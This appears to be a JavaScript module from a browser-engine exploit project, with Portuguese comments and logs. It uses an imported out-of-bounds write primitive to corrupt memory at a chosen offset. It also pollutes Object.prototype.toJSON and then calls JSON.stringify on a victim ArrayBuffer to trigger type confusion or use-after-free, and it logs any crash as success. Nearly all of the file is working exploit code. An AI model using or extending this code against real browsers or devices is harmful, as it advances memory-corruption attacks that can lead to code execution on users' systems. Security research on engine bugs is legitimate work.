// js/script3/testJsonTypeConfusionUAFSpeculative.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, isAdvancedInt64Object, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive, oob_array_buffer_real, oob_dataview_real,
    oob_write_absolute, oob_read_absolute, clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS, KNOWN_STRUCTURE_IDS } from '../config.mjs'; // Adicionado KNOWN_STRUCTURE_IDS

// --- Configuração Padrão para este Teste Específico ---
// Você pode alterar esses valores ao chamar a função principal
const DEFAULT_SPECULATIVE_TEST_CONFIG = {
    victim_ab_size: 64,
    // O offset e valor que causaram o crash no seu log
    corruption_offset: 0x70, // Offset absoluto DENTRO do oob_array_buffer_real
    value_to_write: 0xFFFFFFFF,
    bytes_to_write_for_corruption: 4, // Geralmente StructureIDs ou flags são 32-bit
    ppKey: 'toJSON',
    enablePrototypePollution: true,
    enableOOBWrite: true,
    iterationName: "DefaultIteration", // Para identificar a configuração do teste no log
};
// --- Fim da Configuração Padrão ---

export async function testJsonTypeConfusionUAFSpeculative(testIterationConfig = {}) {
    const FNAME = "testJsonTypeConfusionUAFSpeculative";

    // Mescla a configuração padrão com a configuração da iteração fornecida
    const currentConfig = { ...DEFAULT_SPECULATIVE_TEST_CONFIG, ...testIterationConfig };

    logS3(`--- Iniciando Teste Especulativo UAF/Type Confusion via JSON (S3) ---`, "test", `${FNAME} (${currentConfig.iterationName})`);
    logS3(`   Config: victim_size=${currentConfig.victim_ab_size}, ppKey=${currentConfig.ppKey}`, "info", FNAME);
    logS3(`   PP Habilitada: ${currentConfig.enablePrototypePollution}, Escrita OOB Habilitada: ${currentConfig.enableOOBWrite}`, "info", FNAME);
    if (currentConfig.enableOOBWrite) {
        logS3(`   OOB: offset=${toHex(currentConfig.corruption_offset)}, valor=${toHex(currentConfig.value_to_write)}, size=${currentConfig.bytes_to_write_for_corruption}B`, "info", FNAME);
    }

    let testSuccessfulDueToCrashOrError = false;

    await triggerOOB_primitive();
    if (!oob_array_buffer_real) {
        logS3("Falha ao configurar ambiente OOB. Abortando esta iteração.", "error", FNAME);
        return false;
    }

    let victim_ab = new ArrayBuffer(currentConfig.victim_ab_size);
    logS3(`ArrayBuffer vítima (${currentConfig.victim_ab_size} bytes) recriado para esta iteração.`, "info", FNAME);

    const ppKey = currentConfig.ppKey;
    let originalToJSONDescriptor = null;
    if (currentConfig.enablePrototypePollution) {
        originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
    }
    let pollutionActuallyApplied = false;

    try {
        if (currentConfig.enablePrototypePollution) {
            logS3(`Tentando poluir Object.prototype.${ppKey}`, "info", FNAME);
            Object.defineProperty(Object.prototype, ppKey, {
                value: function() {
                    const currentOperationThis = this;
                    logS3(`[${ppKey} Poluído - ${currentConfig.iterationName}] Chamado!`, "vuln", FNAME);
                    logS3(`  typeof this: ${typeof currentOperationThis}`, "info", FNAME);
                    logS3(`  this instanceof ArrayBuffer: ${currentOperationThis instanceof ArrayBuffer}`, "info", FNAME);
                    // ... (outros logs sobre 'this' como no seu original) ...
                    try {
                        logS3(`  this.constructor.name: ${currentOperationThis.constructor ? currentOperationThis.constructor.name : 'N/A'}`, "info", FNAME);
                    } catch (e) {
                        logS3(`  Erro ao acessar this.constructor.name: ${e.message}`, "warn", FNAME);
                    }
                    logS3(`  Object.prototype.toString.call(this): ${Object.prototype.toString.call(currentOperationThis)}`, "info", FNAME);

                    let details = { byteLength: "N/A", first_dword: "N/A", slice_exists: "N/A" };
                    try {
                        details.byteLength = currentOperationThis.byteLength; // Pode crashar aqui
                        if (typeof currentOperationThis.byteLength === 'number' && currentOperationThis.byteLength >= 4) {
                             let bufferToView = (currentOperationThis instanceof ArrayBuffer) ? currentOperationThis : currentOperationThis.buffer;
                             let offsetInView = (currentOperationThis instanceof ArrayBuffer) ? 0 : (currentOperationThis.byteOffset || 0);
                             if (bufferToView && bufferToView.byteLength >= offsetInView + 4) {
                                details.first_dword = new DataView(bufferToView, offsetInView, 4).getUint32(0, true);
                             }
                        }
                        details.slice_exists = (typeof currentOperationThis.slice === 'function');
                        logS3(`  Detalhes de 'this': byteLength=${details.byteLength}, 1stDword=${details.first_dword === "N/A" ? details.first_dword : toHex(details.first_dword)}, slice_exists=${details.slice_exists}`, "info", FNAME);
                        return { toJSON_executed: true, type: Object.prototype.toString.call(currentOperationThis), details: details };
                    } catch (e_toJSON) {
                        logS3(`  [${ppKey} Poluído - ${currentConfig.iterationName}] ERRO ao acessar props/métodos de 'this': ${e_toJSON.message}`, "critical", FNAME);
                        logS3(`  ---> POTENCIAL TYPE CONFUSION / UAF <--- (config: ${currentConfig.iterationName})`, "vuln", FNAME);
                        testSuccessfulDueToCrashOrError = true;
                        return { toJSON_error: true, message: e_toJSON.message, type_at_error: Object.prototype.toString.call(currentOperationThis) };
                    }
                },
                writable: true,
                configurable: true,
                enumerable: false
            });
            pollutionActuallyApplied = true;
            logS3(`Object.prototype.${ppKey} poluído.`, "good", FNAME);
        }

        if (currentConfig.enableOOBWrite) {
            if (currentConfig.corruption_offset >= 0 && currentConfig.corruption_offset + currentConfig.bytes_to_write_for_corruption <= oob_array_buffer_real.byteLength) {
                logS3(`CORRUPÇÃO: Escrevendo valor ${toHex(currentConfig.value_to_write)} (${currentConfig.bytes_to_write_for_corruption} bytes) em offset absoluto ${toHex(currentConfig.corruption_offset)} do oob_array_buffer_real`, "warn", FNAME);
                oob_write_absolute(currentConfig.corruption_offset, currentConfig.value_to_write, currentConfig.bytes_to_write_for_corruption);
            } else {
                logS3(`AVISO: Offset de corrupção ${toHex(currentConfig.corruption_offset)} está fora dos limites de oob_array_buffer_real. Pulando escrita OOB.`, "warn", FNAME);
            }
        }

        await PAUSE_S3(SHORT_PAUSE_S3);

        logS3(`Chamando JSON.stringify(victim_ab) (config: ${currentConfig.iterationName})...`, "info", FNAME);
        let stringifyResult = null;
        try {
            stringifyResult = JSON.stringify(victim_ab); // PONTO CRÍTICO
            logS3(`Resultado de JSON.stringify(victim_ab): ${String(stringifyResult).substring(0, 300)}`, "info", FNAME);
            if (stringifyResult && typeof stringifyResult === 'string' && stringifyResult.includes("toJSON_error:true")) {
                logS3("SUCESSO ESPECULATIVO CONFIRMADO: Erro capturado dentro do toJSON poluído.", "vuln", FNAME);
                testSuccessfulDueToCrashOrError = true; // Já setado dentro do toJSON, mas reforça
            } else if (stringifyResult && typeof stringifyResult === 'string' && stringifyResult.includes("toJSON_executed:true")) {
                logS3("JSON.stringify executou toJSON poluído, mas sem erro interno aparente nesta chamada.", "good", FNAME);
            }
        } catch (e_stringify) {
            logS3(`ERRO CRÍTICO durante JSON.stringify(victim_ab): ${e_stringify.message}. POTENCIAL UAF/CRASH!`, "critical", FNAME);
            logS3(`  ---> POTENCIAL TYPE CONFUSION / UAF <--- (config: ${currentConfig.iterationName})`, "vuln", FNAME);
            console.error(`JSON.stringify UAF/TC Test Error (config: ${currentConfig.iterationName}):`, e_stringify);
            testSuccessfulDueToCrashOrError = true;
        }

    } catch (mainIterationError) {
        logS3(`Erro na iteração do teste (config: ${currentConfig.iterationName}): ${mainIterationError.message}`, "error", FNAME);
        console.error(mainIterationError);
        testSuccessfulDueToCrashOrError = true; // Um erro inesperado aqui também pode ser um sinal
    } finally {
        if (pollutionActuallyApplied) {
            if (originalToJSONDescriptor) {
                Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor);
            } else {
                delete Object.prototype[ppKey];
            }
        }
        clearOOBEnvironment();
        logS3(`Iteração ${currentConfig.iterationName} concluída. (SucessoEspeculativoPorCrashOuErro: ${testSuccessfulDueToCrashOrError})`, "info", FNAME);
    }

    logS3(`--- Teste Especulativo UAF/Type Confusion via JSON (S3) (config: ${currentConfig.iterationName}) Concluído ---`, "test", FNAME);
    return testSuccessfulDueToCrashOrError;
}
